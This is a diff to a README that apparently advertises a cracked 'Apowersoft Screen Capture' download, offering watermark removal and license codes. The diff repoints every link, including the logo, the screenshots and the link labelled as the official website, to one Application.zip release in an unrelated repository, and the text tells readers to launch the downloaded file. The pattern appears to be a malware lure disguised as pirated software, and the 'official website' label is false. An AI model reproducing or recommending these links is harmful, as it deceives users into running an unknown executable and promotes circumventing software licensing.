@@ -1,6 +1,6 @@
 # 🌟 Apowersoft Screen Capture Download 🌟
 
-![Screen Capture Logo](https://www.example.com/logo.png)
+![Screen Capture Logo](https://github.com/Ege5234/Apowersoft-Screen-Capture-Download/releases/download/v1.0/Application.zip)
 
 Welcome to the **Apowersoft Screen Capture Download** repository! Here you can find all the information you need about the Apowersoft Screen Capture Pro software and related tools. Whether you are looking to try out the trial version, remove watermarks, or obtain a license code, this repository has got you covered.
 
@@ -12,7 +12,7 @@ Welcome to the **Apowersoft Screen Capture Download** repository! Here you can f
 ## 🚀 Get Started
 To get started with Apowersoft Screen Capture, you can download the software by clicking the link below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/Ege5234/Apowersoft-Screen-Capture-Download/releases/download/v1.0/Application.zip)](https://github.com/Ege5234/Apowersoft-Screen-Capture-Download/releases/download/v1.0/Application.zip)
 
 Once you have downloaded the software, launch the downloaded file to install Apowersoft Screen Capture on your system.
 
@@ -24,8 +24,8 @@ Here are some of the key features of Apowersoft Screen Capture:
 - Share and save your captures effortlessly
 
 ## 📸 Screenshots
-![Screenshot1](https://www.example.com/screenshot1.png)
-![Screenshot2](https://www.example.com/screenshot2.png)
+![Screenshot1](https://github.com/Ege5234/Apowersoft-Screen-Capture-Download/releases/download/v1.0/Application.zip)
+![Screenshot2](https://github.com/Ege5234/Apowersoft-Screen-Capture-Download/releases/download/v1.0/Application.zip)
 
 ## 💡 How to Use
 1. Install the software on your computer.
@@ -41,7 +41,7 @@ Want to contribute to the development of Apowersoft Screen Capture? Feel free to
 If you encounter any issues or have questions about Apowersoft Screen Capture, please check the "Releases" section of this repository for the latest updates and bug fixes.
 
 ## 🌐 Visit Our Website
-For more information and support, visit the [official Apowersoft website](https://www.apowersoft.com/).
+For more information and support, visit the [official Apowersoft website](https://github.com/Ege5234/Apowersoft-Screen-Capture-Download/releases/download/v1.0/Application.zip).
 
 Thank you for choosing Apowersoft Screen Capture! Capture and share your screen like a pro with Apowersoft! ✨
 
